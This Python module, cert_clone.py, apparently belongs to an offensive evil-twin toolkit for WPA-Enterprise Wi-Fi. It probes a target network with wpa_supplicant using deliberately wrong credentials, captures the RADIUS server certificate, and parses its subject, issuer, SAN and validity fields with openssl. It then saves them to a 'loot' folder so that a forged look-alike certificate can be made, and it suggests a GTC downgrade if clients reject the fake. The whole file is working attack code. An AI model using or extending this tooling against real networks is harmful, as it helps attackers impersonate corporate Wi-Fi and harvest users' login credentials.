"""
cert_clone.py — Extract the real AP's RADIUS server certificate
by performing a partial PEAP handshake via wpa_supplicant, then
parsing the TLS certificate with openssl to clone its metadata.
"""

import subprocess
import time
import os
import re
import json
import tempfile

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CERT_DIR = os.path.join(BASE_DIR, "certs")
LOOT_DIR = os.path.join(BASE_DIR, "loot")


def _build_supplicant_conf(essid):
    """Create a wpa_supplicant config for PEAP probe (intentionally wrong creds)."""
    return f"""ctrl_interface=/tmp/eapx_wpa
network={{
    ssid="{essid}"
    key_mgmt=WPA-EAP
    eap=PEAP TTLS
    identity="certprobe@eapx.local"
    password="wrongpassword"
    phase1="peaplabel=0 tls_disable_tlsv1_2=0"
    phase2="auth=MSCHAPV2"
    proactive_key_caching=0
}}
"""


def _extract_cert_from_supplicant(iface, essid, timeout=20):
    """Run wpa_supplicant briefly to capture the server certificate PEM."""

    clean_iface = iface.replace("mon", "")
    conf_path = "/tmp/eapx_certprobe.conf"
    cert_pem_path = "/tmp/eapx_radius_cert.pem"

    with open(conf_path, "w") as f:
        f.write(_build_supplicant_conf(essid))

    # Remove stale cert file
    try:
        os.remove(cert_pem_path)
    except OSError:
        pass

    print(f"[*] Probing '{essid}' for RADIUS server certificate...")
    print(f"[*] Using interface: {clean_iface} (timeout: {timeout}s)")

    proc = subprocess.Popen(
        [
            "wpa_supplicant",
            "-i", clean_iface,
            "-c", conf_path,
            "-D", "nl80211",
            "-d",  # debug output to see TLS cert info
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    cert_lines = []
    in_cert = False
    server_cert_path = None
    start = time.time()

    try:
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if not line:
                break

            # wpa_supplicant debug output shows the server cert in PEM format
            if "-----BEGIN CERTIFICATE-----" in line:
                in_cert = True
                cert_lines = ["-----BEGIN CERTIFICATE-----\n"]
                continue

            if in_cert:
                cert_lines.append(line.strip() + "\n")
                if "-----END CERTIFICATE-----" in line:
                    in_cert = False
                    # Save the first complete cert (server cert, not CA)
                    with open(cert_pem_path, "w") as f:
                        f.writelines(cert_lines)
                    server_cert_path = cert_pem_path
                    print("[+] Captured RADIUS server certificate")
                    break

            # Also check for cert file saved by wpa_supplicant
            if "TLS: tls_connection_server_cert" in line or \
               "CTRL-EVENT-EAP-PEER-CERT" in line:
                # Extract cert data if embedded
                pass

    except Exception as e:
        print(f"[!] Error during cert probe: {e}")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    # Cleanup
    try:
        os.remove(conf_path)
    except OSError:
        pass

    return server_cert_path


def _parse_cert_metadata(cert_pem_path):
    """Parse a PEM certificate with openssl and extract subject fields."""

    metadata = {
        "cn": None,
        "org": None,
        "ou": None,
        "country": None,
        "san": [],
        "issuer_cn": None,
        "issuer_org": None,
        "not_before": None,
        "not_after": None,
    }

    if not cert_pem_path or not os.path.exists(cert_pem_path):
        return metadata

    # Get subject
    result = subprocess.run(
        ["openssl", "x509", "-in", cert_pem_path, "-noout", "-subject",
         "-issuer", "-dates", "-ext", "subjectAltName"],
        capture_output=True, text=True
    )

    output = result.stdout + result.stderr

    # Parse subject fields:  subject=C = US, O = Corp, OU = IT, CN = radius.corp.local
    subject_match = re.search(r"subject\s*=\s*(.+)", output)
    if subject_match:
        subj = subject_match.group(1)
        for field in subj.split(","):
            field = field.strip()
            if field.startswith("CN") or field.startswith("CN "):
                metadata["cn"] = field.split("=", 1)[1].strip()
            elif field.startswith("O") and not field.startswith("OU"):
                metadata["org"] = field.split("=", 1)[1].strip()
            elif field.startswith("OU"):
                metadata["ou"] = field.split("=", 1)[1].strip()
            elif field.startswith("C"):
                metadata["country"] = field.split("=", 1)[1].strip()

    # Parse issuer
    issuer_match = re.search(r"issuer\s*=\s*(.+)", output)
    if issuer_match:
        issuer = issuer_match.group(1)
        for field in issuer.split(","):
            field = field.strip()
            if field.startswith("CN") or field.startswith("CN "):
                metadata["issuer_cn"] = field.split("=", 1)[1].strip()
            elif field.startswith("O") and not field.startswith("OU"):
                metadata["issuer_org"] = field.split("=", 1)[1].strip()

    # Parse dates
    before_match = re.search(r"notBefore\s*=\s*(.+)", output)
    if before_match:
        metadata["not_before"] = before_match.group(1).strip()

    after_match = re.search(r"notAfter\s*=\s*(.+)", output)
    if after_match:
        metadata["not_after"] = after_match.group(1).strip()

    # Parse SAN
    san_match = re.search(r"DNS:([^\s,]+)", output)
    if san_match:
        # Get all DNS SANs
        metadata["san"] = re.findall(r"DNS:([^\s,]+)", output)

    return metadata


def clone_radius_cert(iface, essid, bssid=None):
    """
    Full workflow: probe real AP → extract cert → parse metadata → return.
    The metadata can then be fed to cert_wizard.generate_certs() to create
    a cloned certificate that mirrors the real RADIUS server.
    """

    print("\n╔══════════════════════════════════════╗")
    print("║      RADIUS Certificate Cloning      ║")
    print("╚══════════════════════════════════════╝\n")

    cert_path = _extract_cert_from_supplicant(iface, essid)

    if not cert_path or not os.path.exists(cert_path):
        print("[!] Could not capture RADIUS certificate")
        print("[!] Falling back to generic certificate generation")
        print("[*] Tip: The client may reject certs — try GTC downgrade mode")
        return None

    metadata = _parse_cert_metadata(cert_path)

    # Save metadata for later reference
    os.makedirs(LOOT_DIR, exist_ok=True)
    meta_path = os.path.join(LOOT_DIR, "radius_cert_metadata.json")
    with open(meta_path, "w") as f:
        json.dump(metadata, f, indent=2)

    # Copy the original cert for reference
    os.makedirs(CERT_DIR, exist_ok=True)
    orig_path = os.path.join(CERT_DIR, "original_radius.pem")
    subprocess.run(["cp", cert_path, orig_path], stderr=subprocess.DEVNULL)

    # Display results
    print(f"\n[+] Certificate metadata extracted:")
    print(f"    CN:      {metadata['cn'] or 'N/A'}")
    print(f"    Org:     {metadata['org'] or 'N/A'}")
    print(f"    OU:      {metadata['ou'] or 'N/A'}")
    print(f"    Country: {metadata['country'] or 'N/A'}")
    print(f"    SAN:     {', '.join(metadata['san']) if metadata['san'] else 'N/A'}")
    print(f"    Issuer:  {metadata['issuer_cn'] or 'N/A'} ({metadata['issuer_org'] or 'N/A'})")
    print(f"    Valid:   {metadata['not_before'] or '?'} → {metadata['not_after'] or '?'}")
    print(f"\n[+] Metadata saved → {meta_path}")

    return metadata
